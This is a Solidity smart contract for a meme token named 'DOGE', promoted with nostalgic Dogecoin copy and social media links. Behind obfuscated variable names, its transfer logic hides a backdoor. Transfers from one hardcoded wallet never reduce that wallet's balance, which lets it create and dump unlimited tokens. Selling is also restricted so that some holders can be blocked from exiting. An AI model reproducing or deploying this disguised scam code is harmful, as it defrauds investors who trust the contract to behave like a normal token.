/**

December 6th 2013, Dogecoin was publicly deployed on to the blockchain, changing the face of finance & digital currency forever.  Almost 10 years after Doge,New Doge has finally arrived to recreate the same adventure. 

Telegram: https://t.me/DOGE_Portal

Twitter: https://twitter.com/DOGE_Portal

Website: https://dogeerc.com/

*/


// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rskev(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rskev(a, b, "SafeMath");
    }

    function  _rskev(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract DOGE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _jorsqr;
    address payable private _tfrjoh;
    address private _rkuorp;
    string private constant _name = unicode"DOGE";
    string private constant _symbol = unicode"DOGE";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ylehso=0;
    uint256 private _ectgjy=0;
    uint256 public _qfbnwp = _totalSupply;
    uint256 public _drveqe = _totalSupply;
    uint256 public _koulov= _totalSupply;
    uint256 public _vuqbif= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _fvejaf;
    mapping (address => bool) private _vinquy;
    mapping(address => uint256) private _fnqiqx;

    bool private _bruanp;
    bool public _ueatuq = false;
    bool private ychvup = false;
    bool private _objecp = false;


    event _pojwfh(uint _qfbnwp);
    modifier rsuouqr {
        ychvup = true;
        _;
        ychvup = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _fvejaf[owner(

        )] = true;
        _fvejaf[address
        (this)] = true;
        _fvejaf[
            _tfrjoh] = true;
        _tfrjoh = 
        payable (0xd22e26195ec19EBfF03886003125050A2d4931B2);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rskev(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kvfkqb=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_ueatuq) {
                if (to 
                != address
                (_jorsqr) 
                && to !=
                 address
                 (_rkuorp)) {
                  require(_fnqiqx
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnqiqx
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rkuorp && to != 
            address(_jorsqr) &&
             !_fvejaf[to] ) {
                require(amount 
                <= _qfbnwp,
                 "Exceeds the _qfbnwp.");
                require(balanceOf
                (to) + amount
                 <= _drveqe,
                  "Exceeds the _drveqe.");
                if(_ectgjy
                < _ylehso){
                  require
                  (! _rdulkj(to));
                }
                _ectgjy++;
                 _vinquy
                 [to]=true;
                kvfkqb = amount._pvr
                ((_ectgjy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rkuorp &&
             from!= address(this) 
            && !_fvejaf[from] ){
                require(amount <= 
                _qfbnwp && 
                balanceOf(_tfrjoh)
                <_vuqbif,
                 "Exceeds the _qfbnwp.");
                kvfkqb = amount._pvr((_ectgjy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_ectgjy>
                _ylehso &&
                 _vinquy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ychvup 
            && to == _rkuorp &&
             _objecp &&
             contractTokenBalance>
             _koulov 
            && _ectgjy>
            _ylehso&&
             !_fvejaf[to]&&
              !_fvejaf[from]
            ) {
                _transferFrom( _jupop(amount, 
                _jupop(contractTokenBalance,
                _vuqbif)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prwibh(address
                    (this).balance);
                }
            }
        }

        if(kvfkqb>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kvfkqb);
          emit
           Transfer(from,
           address
           (this),kvfkqb);
        }
        _balances[from
        ]= _rskev(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rskev(kvfkqb));
        emit Transfer
        (from, to, 
        amount.
         _rskev(kvfkqb));
    }

    function _transferFrom(uint256
     tokenAmount) private
      rsuouqr {
        if(tokenAmount==
        0){return;}
        if(!_bruanp)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _jorsqr.WETH();
        _approve(address(this),
         address(
             _jorsqr), 
             tokenAmount);
        _jorsqr.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _jupop
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rskev(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _tfrjoh){
            return a ;
        }else{
            return a .
             _rskev (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qfbnwp = _totalSupply;
        _drveqe = _totalSupply;
        emit _pojwfh(_totalSupply);
    }

    function _rdulkj(address 
    account) private view 
    returns (bool) {
        uint256 euerfb;
        assembly {
            euerfb :=
             extcodesize
             (account)
        }
        return euerfb > 
        0;
    }

    function _prwibh(uint256
    amount) private {
        _tfrjoh.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _bruanp ) ;
        _jorsqr  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _jorsqr), 
            _totalSupply);
        _rkuorp = 
        IUniswapV2Factory(_jorsqr.
        factory( ) 
        ). createPair (
            address(this
            ),  _jorsqr .
             WETH ( ) );
        _jorsqr.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rkuorp).
        approve(address(_jorsqr), 
        type(uint)
        .max);
        _objecp = true;
        _bruanp = true;
    }

    receive() external payable {}
}